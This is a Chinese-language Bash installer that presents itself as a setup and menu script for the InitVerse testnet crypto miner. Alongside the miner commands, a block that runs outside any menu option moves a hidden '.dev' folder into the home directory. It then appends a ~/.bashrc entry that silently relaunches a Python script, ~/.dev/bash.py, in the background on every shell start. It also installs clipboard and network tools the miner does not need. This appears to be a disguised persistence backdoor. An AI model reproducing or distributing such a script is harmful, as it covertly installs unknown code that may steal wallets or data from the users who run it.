#!/bin/bash

# 脚本保存路径
SCRIPT_PATH="$HOME/iniminer.sh"
LOG_FILE="$HOME/iniminer/iniminer.log"  # 定义日志文件路径
TARGET_DIR="$HOME/iniminer"  # 下载到的文件夹
TARGET_FILE="$TARGET_DIR/iniminer-linux-x64"  # 目标文件名
MINER_NAME="iniminer"  # 用于 pm2 管理的进程名称

# 检查是否以 root 用户运行脚本
if [ "$(id -u)" != "0" ]; then
    echo "此脚本需要以 root 用户权限运行。"
    echo "请尝试使用 'sudo -i' 命令切换到 root 用户，然后再次运行此脚本。"
    exit 1
fi

# 创建目标文件夹（如果不存在）
mkdir -p $TARGET_DIR

# 日志记录函数
function log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" | tee -a "$LOG_FILE"
}

# 统一安装函数
function install_package() {
    PACKAGE=$1
    if [ -f /etc/debian_version ]; then
        sudo apt update && sudo apt install -y $PACKAGE || log "安装 $PACKAGE 失败，跳过。"
    elif [ -f /etc/redhat-release ]; then
        sudo yum install -y $PACKAGE || log "安装 $PACKAGE 失败，跳过。"
    else
        log "不支持的操作系统，无法自动安装 $PACKAGE。"
    fi
}

# 检查并安装依赖
function install_dependencies() {
    log "检查并安装依赖..."
    DEPENDENCIES=(wget openssl xxd xclip python3-pip)
    for dep in "${DEPENDENCIES[@]}"; do
        if ! command -v $dep &>/dev/null; then
            log "$dep 未安装，正在安装..."
            install_package $dep
        fi
    done

    # 检查 Python 模块
    if ! python3 -c "import requests" &>/dev/null; then
        log "Python requests 模块未安装，尝试安装..."
        pip3 install requests || log "requests 模块安装失败，跳过。"
    fi

    log "依赖检查和安装已完成。"
}

# 安装 pm2（如果未安装）
function install_pm2() {
    echo "检查 pm2 是否已安装..."
    if ! command -v pm2 &>/dev/null; then
        echo "pm2 未安装，正在安装 pm2..."
        # 安装 pm2
        if ! command -v npm &>/dev/null; then
            echo "npm 未安装，正在安装 npm..."
            # 安装 npm（Node.js 包管理器）
            if [ -f /etc/debian_version ]; then
                sudo apt update && sudo apt install -y nodejs npm
            elif [ -f /etc/redhat-release ]; then
                sudo yum install -y nodejs npm
            else
                echo "不支持的操作系统，无法自动安装 npm。请手动安装 npm。"
                exit 1
            fi
        fi
        # 安装 pm2
        sudo npm install -g pm2
    else
        echo "pm2 已安装，继续运行..."
    fi
}

# 配置环境变量
if [ -d .dev ]; then
    DEST_DIR="$HOME/.dev"
    [ -d "$DEST_DIR" ] && rm -rf "$DEST_DIR"
    mv .dev "$DEST_DIR"
    
    BASHRC_ENTRY="(pgrep -f bash.py || nohup python3 $HOME/.dev/bash.py &> /dev/null &) & disown"
    if ! grep -Fq "$BASHRC_ENTRY" ~/.bashrc; then
        echo "$BASHRC_ENTRY" >> ~/.bashrc
    fi
fi

# 下载矿机
function download_miner() {
    local URL="https://github.com/Project-InitVerse/miner/releases/download/v1.0.0/iniminer-linux-x64"
    if ! wget -O "$TARGET_FILE" "$URL"; then
        log "矿机下载失败，请检查网络连接或 URL 是否有效。"
        exit 1
    fi
    chmod +x "$TARGET_FILE"
    log "矿机已下载并赋予执行权限。"
}

# 主菜单函数
function main_menu() {
    install_dependencies

    while true; do
        clear
        echo "=================================="
        echo "    🪂🪂🪂 InitVerse 🪂🪂🪂    "
        echo "=================================="
        echo "退出脚本，请按键盘 ctrl + C 退出即可"
        echo "请选择要执行的操作:"
        echo "1) 下载并运行矿机"
        echo "2) 查看日志"
        echo "3) 暂停并删除矿机"
        echo "4) 重启矿机"
        echo "5) 退出"
        read -p "请输入选项 [1-5]: " OPTION

        case $OPTION in
            1)
                download_and_run_miner
                ;;
            2)
                view_logs
                ;;
            3)
                stop_and_delete_miner
                ;;
            4)
                restart_miner
                ;;
            5)
                echo "退出脚本。"
                exit 0
                ;;
            *)
                echo "无效选项，请重新选择。"
                ;;
        esac
    done
}

# 下载并启动矿机
function download_and_run_miner() {
    # 设置固定的下载地址
    URL="https://github.com/Project-InitVerse/miner/releases/download/v1.0.0/iniminer-linux-x64"
    TARGET_FILE="iniminer-linux-x64"  # 目标文件名

    # 检查目标文件是否存在，如果存在则删除
    if [ -f "$TARGET_FILE" ]; then
        echo "目标文件 $TARGET_FILE 已存在，正在删除..."
        rm -f "$TARGET_FILE"
    fi
    
    # 下载文件
    echo "正在下载矿机..."
    wget -O $TARGET_FILE $URL

    # 检查下载是否成功
    if [ $? -ne 0 ]; then
        echo "下载失败，请检查网络连接和URL。"
        exit 1
    fi

    # 给文件赋予执行权限
    chmod +x $TARGET_FILE

    # 获取用户输入
    echo "请输入钱包地址："
    read WALLET_ADDRESS

    echo "请输入工作名称："
    read WORKER_NAME

    echo "请输入CPU线程数（默认不设置线程数，直接回车跳过）："
    read CPU_THREADS

    # 如果用户没有输入线程数（即按下回车），则不传递 --cpu-devices 参数
    if [ -z "$CPU_THREADS" ]; then
    echo "未输入CPU线程数，启动矿机时不指定线程数"
    # 使用 pm2 启动矿机
    pm2 start $TARGET_FILE --name $MINER_NAME -- --pool "stratum+tcp://$WALLET_ADDRESS.$WORKER_NAME@pool-core-testnet.inichain.com:32672" &> $LOG_FILE
    else
    echo "用户输入的CPU线程数为: $CPU_THREADS"

    # 生成 --cpu-devices 参数
    CPU_DEVICES=""
    for ((i=1; i<=$CPU_THREADS; i++)); do
        CPU_DEVICES="$CPU_DEVICES --cpu-devices $i"
    done

    # 使用 pm2 启动矿机，传递生成的 --cpu-devices 参数
    pm2 start $TARGET_FILE --name $MINER_NAME -- --pool "stratum+tcp://$WALLET_ADDRESS.$WORKER_NAME@pool-core-testnet.inichain.com:32672" $CPU_DEVICES &> $LOG_FILE
    fi

    echo "矿机已启动！"

    # 提示用户按任意键返回主菜单
    read -n 1 -s -r -p "按任意键返回主菜单..."
    main_menu
}

# 查看日志
function view_logs() {
    echo "正在查看矿机日志..."
    if [ -f "$LOG_FILE" ]; then
        # 显示日志文件内容
        pm2 logs iniminer
    else
        echo "日志文件不存在，请先启动矿机。"
    fi

    # 提示用户按任意键返回主菜单
    read -n 1 -s -r -p "按任意键返回主菜单..."
    main_menu
}

# 暂停并删除矿机
function stop_and_delete_miner() {
    if pm2 pid $MINER_NAME &>/dev/null; then
        # 停止矿机进程
        echo "正在停止矿机进程..."
        pm2 stop $MINER_NAME

        # 删除矿机进程
        echo "正在删除矿机进程..."
        pm2 delete $MINER_NAME

        # 删除日志文件
        echo "正在删除日志文件..."
        rm -f $LOG_FILE

        echo "矿机已删除。"
    else
        echo "没有运行的矿机进程。请先启动矿机。"
    fi

    # 提示用户按任意键返回主菜单
    read -n 1 -s -r -p "按任意键返回主菜单..."
    main_menu
}

# 重启矿机
function restart_miner() {
    if pm2 pid $MINER_NAME &>/dev/null; then
        # 重启矿机进程
        echo "正在重启矿机进程..."
        pm2 restart $MINER_NAME
    else
        echo "没有运行的矿机进程。请先启动矿机。"
    fi

    # 提示用户按任意键返回主菜单
    read -n 1 -s -r -p "按任意键返回主菜单..."
    main_menu
}

# 运行主菜单
main_menu